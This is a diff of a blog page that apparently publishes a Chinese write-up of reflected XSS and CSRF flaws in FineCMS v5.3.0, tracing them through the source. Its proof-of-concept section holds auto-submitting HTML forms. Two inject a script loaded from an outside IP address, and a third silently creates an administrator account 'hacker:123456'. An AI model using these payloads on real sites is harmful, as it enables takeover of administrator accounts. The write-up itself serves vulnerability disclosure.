@@ -6,17 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="K4ngx.github.io">
-  <title>Tag: Web | K4ng&#39;s blog</title>
+  <title>FineCMS v5.3.0 XSS/CSRF | K4ng&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="FZU 15级本科生">
-<meta property="og:type" content="website">
-<meta property="og:title" content="K4ng&#39;s blog">
-<meta property="og:url" content="K4ngx.github.io/tags/Web/index.html">
+  <meta name="description" content="0x01 版本类型源码信息：FineCMS v5.3.0 bulid 20180206 问题文件：/finecms/dayrui/libraries/Template.php 漏洞类型：反射型XSS、CSRF 0x02 漏洞详情FineCMS后台的管理员管理和会员管理的搜索功能，未进行字符编码与过滤而导致反射型XSS。 在搜索框输入&amp;quot;&amp;gt;&amp;lt;svg/onload=alert(1)">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FineCMS v5.3.0 XSS&#x2F;CSRF">
+<meta property="og:url" content="K4ngx.github.io/2018/04/24/finecms/index.html">
 <meta property="og:site_name" content="K4ng&#39;s blog">
-<meta property="og:description" content="FZU 15级本科生">
+<meta property="og:description" content="0x01 版本类型源码信息：FineCMS v5.3.0 bulid 20180206 问题文件：/finecms/dayrui/libraries/Template.php 漏洞类型：反射型XSS、CSRF 0x02 漏洞详情FineCMS后台的管理员管理和会员管理的搜索功能，未进行字符编码与过滤而导致反射型XSS。 在搜索框输入&amp;quot;&amp;gt;&amp;lt;svg/onload=alert(1)">
+<meta property="og:image" content="/24/finecms/0.png">
+<meta property="og:image" content="/24/finecms/1.png">
+<meta property="og:image" content="/24/finecms/2.png">
+<meta property="og:image" content="/24/finecms/3.png">
+<meta property="og:image" content="/24/finecms/4.png">
+<meta property="og:image" content="/24/finecms/5.png">
+<meta property="og:image" content="/24/finecms/6.png">
+<meta property="og:image" content="/24/finecms/7.png">
+<meta property="og:image" content="/24/finecms/8.png">
+<meta property="og:image" content="/24/finecms/9.png">
+<meta property="og:updated_time" content="2018-04-24T10:57:14.147Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="K4ng&#39;s blog">
-<meta name="twitter:description" content="FZU 15级本科生">
+<meta name="twitter:title" content="FineCMS v5.3.0 XSS&#x2F;CSRF">
+<meta name="twitter:description" content="0x01 版本类型源码信息：FineCMS v5.3.0 bulid 20180206 问题文件：/finecms/dayrui/libraries/Template.php 漏洞类型：反射型XSS、CSRF 0x02 漏洞详情FineCMS后台的管理员管理和会员管理的搜索功能，未进行字符编码与过滤而导致反射型XSS。 在搜索框输入&amp;quot;&amp;gt;&amp;lt;svg/onload=alert(1)">
+<meta name="twitter:image" content="/24/finecms/0.png">
   
     <link rel="alternative" href="/atom.xml" title="K4ng&#39;s blog" type="application/atom+xml">
   
@@ -150,36 +163,96 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-finecms" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      FineCMS v5.3.0 XSS/CSRF
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/24/finecms/" class="archive-article-date">
+
+        
+        <a href="/2018/04/24/finecms/" class="archive-article-date">
   	<time datetime="2018-04-24T10:57:14.147Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-24</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/24/finecms/">FineCMS v5.3.0 XSS/CSRF</a>
-    </h1>
-  
+        
+      </header>
+    
 
-        <div class="article-info info-on-right">
-          
+
+    
+        <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+            <span class="btn-bg"></span>
+            <span class="btn-text">文章导航</span>
+          </p>
+	<div id="toc-article" class="toc-article">
+	    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+		<strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-版本类型"><span class="toc-number">1.</span> <span class="toc-text">0x01 版本类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞详情"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞详情</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞POC"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞POC</span></a></li></ol>
+         </div>
+   <script type="text/javascript">
+	function showToc(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:block");
+		show_toc_btn.setAttribute("style","display:none");
+		};
+	function showBtn(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:none");
+		show_toc_btn.setAttribute("style","display:block");
+		};
+   </script>
+      		
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-版本类型"><a href="#0x01-版本类型" class="headerlink" title="0x01 版本类型"></a>0x01 版本类型</h2><p>源码信息：FineCMS v5.3.0 bulid 20180206</p>
+<p>问题文件：/finecms/dayrui/libraries/Template.php</p>
+<p>漏洞类型：反射型XSS、CSRF</p>
+<h2 id="0x02-漏洞详情"><a href="#0x02-漏洞详情" class="headerlink" title="0x02 漏洞详情"></a>0x02 漏洞详情</h2><p>FineCMS后台的管理员管理和会员管理的搜索功能，未进行字符编码与过滤而导致反射型XSS。</p>
+<p>在搜索框输入<code>&quot;&gt;&lt;svg/onload=alert(1)//</code>，点击搜索并deBug跟踪数据。</p>
+<p><img src="/24/finecms/0.png" alt=""></p>
+<p>可发现POST参数<code>keyword</code>传进了<code>/finecms/dayrui/controllers/Root.php</code>中的index()方法，并通过<code>$this-&gt;input-&gt;post(&#39;keyword&#39;, TRUE)</code>来获取数值（进行XSS、不可见字符和基于黑名单等等的过滤._.）。</p>
+<p>然后送进了<code>$this-&gt;member_model-&gt;get_admin_all()</code>方法进行数据库查询操作（没有可乘之机）。接着通过<code>$this-&gt;template-&gt;
+display()</code>调用输出模板。</p>
+<p><img src="/24/finecms/1.png" alt=""></p>
+<p>跟踪到输出模板函数<code>/finecms/dayrui/libraries/Template.php</code>中80行的<code>display()</code>方法。</p>
+<p><img src="/24/finecms/2.png" alt=""></p>
+<p>在93行中通过<code>load_view_file</code>方法加载了模板缓存文件，<strong>并将缓存文件用<code>include</code>包含</strong>。（执行了文件中的php语句）</p>
+<p>在缓存文件<code>/cache/templates/finecms.dayrui.templates.admin_index.html.cache.php</code>的33行可以看到，直接执行了<code>echo</code>语句，而<code>$_POST[&#39;keyword&#39;]</code>却是可控的，没有经过任何的过滤和编码。从而造成了反射型XSS。</p>
+<p><img src="/24/finecms/3.png" alt=""></p>
+<p>还有一处原理差不多的反射型XSS在会员管理的搜索框处。</p>
+<p><img src="/24/finecms/4.png" alt=""></p>
+<p>点击搜索，debug跟踪数据，发现POST发送的<code>keyword</code>在<code>/finecms/dayrui/controllers/admin/Member.php</code>的70行被赋值到变量<code>$param</code>中。（跟踪函数<code>$this-&gt;member_model-&gt;limit_page()</code>可知道最终是在<code>/finecms/dayrui/models/Member_model.php</code>中<code>_where()</code>方法的694行被赋值的。）之后没有再对<code>$param</code>进行编码和过滤便执行了<code>$this-&gt;template-&gt;display(&#39;member_index.html&#39;)</code></p>
+<p><img src="/24/finecms/5.png" alt=""></p>
+<p><img src="/24/finecms/6.png" alt=""></p>
+<p>同样是在在输出模板函数<code>/finecms/dayrui/libraries/Template.php</code>中的<code>display()</code>方法。在93行中<strong>将缓存文件用<code>include</code>包含</strong>。（执行了文件中的php语句）</p>
+<p><img src="/24/finecms/7.png" alt=""></p>
+<p>跟踪查看缓存文件<code>/cache/templates/finecms.dayrui.templates.member_index.html.cache.php</code>，可以看到，在43行直接对<code>$param[&#39;keyword&#39;]</code>进行了输出，从导致了另一个反射型XSS。</p>
+<p><img src="/24/finecms/8.png" alt=""></p>
+<p><strong>BTW：添加后台管理员帐号请求并没有附带token值，因此可以直接利用CSRF来添加一个管理员帐号。</strong></p>
+<h2 id="0x03-漏洞POC"><a href="#0x03-漏洞POC" class="headerlink" title="0x03 漏洞POC"></a>0x03 漏洞POC</h2><p>0x01 利用管理员管理处的XSS，构造表单，当管理员访问了如下html，则会在后台添加一个管理员帐号<code>test:123456</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://FineCMS的域名或IP/admin.php?c=root&amp;m=index"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">name</span>=<span class="string">"myform"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"keyword"</span> <span class="attr">value</span>=<span class="string">'"&gt;&lt;script src=http://115.159.209.191/add.js&gt;&lt;/script&gt;'</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">	</div><div class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.myform.submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>0x02 利用会员管理处的XSS。（创建管理员帐号时不能有相同名称或邮箱）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://FineCMS的域名或IP/admin.php?c=membe&amp;m=index"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">name</span>=<span class="string">"myform"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data[field]"</span> <span class="attr">value</span>=<span class="string">'username'</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data[keyword]"</span> <span class="attr">value</span>=<span class="string">'"&gt;&lt;script src=http://115.159.209.191/add.js&gt;&lt;/script&gt;'</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">	</div><div class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.myform.submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>0x03 直接利用CSRF，当管理员访问如下html时，将创建一个管理员帐号<code>hacker:123456</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://FineCMS的域名或IP/admin.php?c=root&amp;m=add"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">name</span>=<span class="string">"myform"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data[username]"</span> <span class="attr">value</span>=<span class="string">'hacker'</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data[password]"</span> <span class="attr">value</span>=<span class="string">'123456'</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data[email]"</span> <span class="attr">value</span>=<span class="string">'random@qq.cn'</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data[phone]"</span> <span class="attr">value</span>=<span class="string">'1234'</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">		<span class="built_in">document</span>.myform.submit();</div><div class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>成功添加：</p>
+<p><img src="/24/finecms/9.png" alt=""></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -191,183 +264,89 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:K4ngx.github.io/2018/04/24/finecms/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/04/xxe/" class="archive-article-date">
-  	<time datetime="2018-03-03T18:11:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-04</time>
-</a>
-        </div>
-    	 
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/04/xxe/">浅谈XXE漏洞</a>
-    </h1>
+  
+    <a href="/2018/03/14/N1CTF2018-Easyphp-WP/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">N1CTF2018_Easyphp_WP</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+  
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XXE</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/02/17/pwReset/" class="archive-article-date">
-  	<time datetime="2018-02-17T07:42:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/02/17/pwReset/">十类任意密码重置</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/02/06/SQLi/" class="archive-article-date">
-  	<time datetime="2018-02-06T09:51:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/02/06/SQLi/">浅谈SQLi</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">sql</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/04/xss/" class="archive-article-date">
-  	<time datetime="2018-01-04T12:23:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/04/xss/">浅谈XSS</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">xss</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -390,9 +369,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		root: "/",
